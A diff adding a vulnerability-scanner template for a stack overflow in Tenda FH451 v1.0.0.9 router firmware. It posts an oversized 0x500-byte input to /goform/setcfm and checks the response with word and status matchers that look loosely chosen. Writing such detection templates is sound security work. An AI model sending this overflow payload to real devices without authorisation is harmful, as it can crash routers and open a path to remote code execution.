@@ -1,0 +1,36 @@
+id: tenda-fh451-stack-overflow
+
+info:
+  name: Tenda FH451 v1.0.0.9 - Stack Overflow
+  author: vidura2
+  severity: high
+  description: |
+    This template detects a stack overflow vulnerability in Tenda FH451 v1.0.0.9. The vulnerability exists in the RouteStatic function, allowing attackers to send overly long input data causing a buffer overflow, which could lead to remote code execution (RCE).
+  reference:
+    - https://github.com/BenJpopo/V/blob/main/Tenda/FH451/RouteStatic.md
+  tags: tenda,overflow,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/goform/setcfm"
+    body: |
+      funcname=save_list_data&funcpara1={{overflow_payload}}&funcpara2=aaaaaa
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      overflow_payload:
+        - "{{'a' * 0x500}}" # Overflow payload
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "error"
+          - "successful"
+        condition: and
+
+      - type: status
+        status:
+          - 200
